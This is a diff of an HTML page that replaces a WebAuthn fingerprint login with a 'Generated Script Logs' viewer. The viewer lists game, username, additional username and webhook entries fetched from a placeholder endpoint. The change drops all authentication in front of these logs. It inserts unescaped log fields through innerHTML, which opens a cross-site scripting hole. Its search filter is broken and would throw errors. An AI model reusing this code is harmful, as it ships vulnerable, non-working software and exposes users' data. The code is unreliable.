@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fingerprint Authentication</title>
+    <title>Log Viewer</title>
     <style>
         body {
             background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
@@ -13,79 +13,108 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+            flex-direction: column;
             margin: 0;
         }
-        .auth-container {
-            background: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
-            text-align: center;
-        }
         h1 {
-            font-size: 2rem;
+            font-size: 3rem;
         }
-        button {
-            background: #ff0080;
-            padding: 12px 24px;
+        .log-container {
+            width: 80%;
+            max-width: 1200px;
+            margin-top: 20px;
+            background: #1e1e2e;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
+            overflow-y: auto;
+            max-height: 70vh;
+        }
+        .log-entry {
+            background: #333;
             border-radius: 8px;
-            cursor: pointer;
-            font-size: 1rem;
-            transition: 0.3s;
+            padding: 10px;
+            margin-bottom: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
         }
-        button:hover {
-            background: #ff0055;
-            transform: scale(1.1);
+        .log-entry h3 {
+            margin: 0;
         }
-        .error {
-            color: red;
-            margin-top: 10px;
+        .log-entry p {
+            margin: 5px 0;
+        }
+        .search-bar {
+            margin-top: 20px;
+            width: 80%;
+            max-width: 400px;
+            padding: 10px;
+            border-radius: 8px;
+            border: none;
+            background: #444;
+            color: white;
+        }
+        .search-bar:focus {
+            outline: none;
+            background: #555;
         }
     </style>
 </head>
 <body>
-    <div class="auth-container">
-        <h1>Login with Fingerprint</h1>
-        <button onclick="authenticate()">Authenticate</button>
-        <p id="error-message" class="error"></p>
-    </div>
+    <h1>Generated Script Logs</h1>
+    <input type="text" id="search" class="search-bar" placeholder="Search logs..." onkeyup="filterLogs()">
+    <div id="log-container" class="log-container"></div>
 
     <script>
-        async function authenticate() {
-            try {
-                const publicKeyCredentialRequestOptions = await fetch('/webauthn/authentication') // Backend call to get authentication options
-                    .then(res => res.json());
-
-                // Perform WebAuthn authentication
-                const credential = await navigator.credentials.get({
-                    publicKey: publicKeyCredentialRequestOptions
-                });
-
-                // Send the result to the server for verification
-                const result = await fetch('/webauthn/verify-authentication', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        id: credential.id,
-                        rawId: Array.from(new Uint8Array(credential.rawId)),
-                        response: {
-                            authenticatorData: Array.from(new Uint8Array(credential.response.authenticatorData)),
-                            clientDataJSON: Array.from(new Uint8Array(credential.response.clientDataJSON)),
-                            signature: Array.from(new Uint8Array(credential.response.signature)),
-                        },
-                    }),
-                });
-
-                if (result.ok) {
-                    // Authentication successful, redirect to the script generator page
-                    window.location.href = 'index.html';
-                } else {
-                    throw new Error('Authentication failed');
-                }
-            } catch (error) {
-                document.getElementById('error-message').innerText = error.message;
-            }
+        // Function to fetch logs from your backend
+        function fetchLogs() {
+            fetch('https://yourgithubsite.com/logs') // This is the endpoint that fetches the logs
+                .then(response => response.json())
+                .then(data => {
+                    displayLogs(data);
+                })
+                .catch(err => console.error('Error fetching logs:', err));
         }
+
+        // Function to display logs in the front-end
+        function displayLogs(logs) {
+            const logContainer = document.getElementById('log-container');
+            logContainer.innerHTML = ''; // Clear previous logs
+
+            logs.forEach(log => {
+                const logEntry = document.createElement('div');
+                logEntry.classList.add('log-entry');
+                logEntry.innerHTML = `
+                    <h3>${log.title}</h3>
+                    <p><strong>Game:</strong> ${log.game}</p>
+                    <p><strong>Username:</strong> ${log.username}</p>
+                    <p><strong>Additional Username:</strong> ${log.additionalUsername}</p>
+                    <p><strong>Webhook:</strong> ${log.webhook}</p>
+                `;
+                logContainer.appendChild(logEntry);
+            });
+        }
+
+        // Function to filter logs based on search input
+        function filterLogs() {
+            const searchQuery = document.getElementById('search').value.toLowerCase();
+            const logEntries = document.querySelectorAll('.log-entry');
+
+            logEntries.forEach(entry => {
+                const game = entry.querySelector('p strong:nth-child(1)').nextElementSibling.textContent.toLowerCase();
+                const username = entry.querySelector('p strong:nth-child(2)').nextElementSibling.textContent.toLowerCase();
+                const additionalUsername = entry.querySelector('p strong:nth-child(3)').nextElementSibling.textContent.toLowerCase();
+                const webhook = entry.querySelector('p strong:nth-child(4)').nextElementSibling.textContent.toLowerCase();
+
+                if (game.includes(searchQuery) || username.includes(searchQuery) || additionalUsername.includes(searchQuery) || webhook.includes(searchQuery)) {
+                    entry.style.display = 'block';
+                } else {
+                    entry.style.display = 'none';
+                }
+            });
+        }
+
+        // Fetch the logs when the page loads
+        window.onload = fetchLogs;
     </script>
 </body>
 </html>
